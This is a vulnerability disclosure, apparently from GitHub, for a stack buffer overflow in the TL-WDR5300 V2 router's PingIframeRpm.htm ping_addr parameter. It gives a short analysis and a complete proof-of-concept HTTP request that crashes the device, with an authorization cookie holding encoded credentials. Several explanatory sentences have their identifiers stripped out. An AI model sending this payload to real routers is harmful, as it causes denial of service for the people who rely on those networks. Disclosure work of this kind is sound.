# TL-WDR5300 V2
Manufacturer: TP-Link

Model: TL-WDR5300 V2.0

Firmware Version: 3.13.35 Build 140311 Rel.34971n
# Vulnerability Overview
A buffer overflow vulnerability in the TP-Link WDR5300 v2 firmware allows an authorized attacker to cause a denial-of-service (DoS) attack by sending an HTTP request with a very long "ping_addr" parameter to the webpage, potentially crashing the router./userRpm/PingIframeRpm.htm

The trigger point is located in the method of the component.

<img width="1551" height="951" alt="image" src="https://github.com/user-attachments/assets/958b340a-cd9a-472c-8588-7dcc3c3370ae" />

By obtaining from the request parameters and constructing with the parameter and with the parameter , the program can execute the following code.ping_addrdoTypepingisNewnew
<img width="975" height="603" alt="image" src="https://github.com/user-attachments/assets/8fc99bce-09a4-4b96-a615-2347b5c13337" />
The vulnerability is located in the method.ipAddrDispose
<img width="1362" height="1039" alt="image" src="https://github.com/user-attachments/assets/1075be30-8ba2-42a4-b6a4-04828f012c02" />
This function only checks if there is an empty character in , but does not check the length. Then, the value of is written to the v21 array in a byte-by-byte loop. v21 has a length of only 52 bytes, and exceeding this length will cause an overflow.ping_addrping_addr
# POC

```
GET /userRpm/PingIframeRpm.htm?ping_addr=127.0.0.1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&doType=ping&isNew=new&sendNum=4&pSize=64&overTime=1000 HTTP/1.1

Host: 192.168.1.1

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://192.168.1.1/userRpm/WanDynamicIpCfgRpm.htm?wantype=0&mtu=1500&hostName=TL-WDR5300&downBandwidth=100000&upBandwidth=100000&Save=%B1%A3+%B4%E6

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: Authorization=Basic%20YWRtaW46ODg4ODg4ODg%3D

Connection: close

```
<img width="2000" height="1173" alt="image" src="https://github.com/user-attachments/assets/c72cc090-8a0c-4a00-b79f-100b6dcf239f" />

<img width="1989" height="1294" alt="image" src="https://github.com/user-attachments/assets/39ef60c8-3286-453e-bde2-647b7dc8dabc" />

<img width="2015" height="1143" alt="image" src="https://github.com/user-attachments/assets/a066692d-6dde-4765-937e-0999bc9afa4f" />
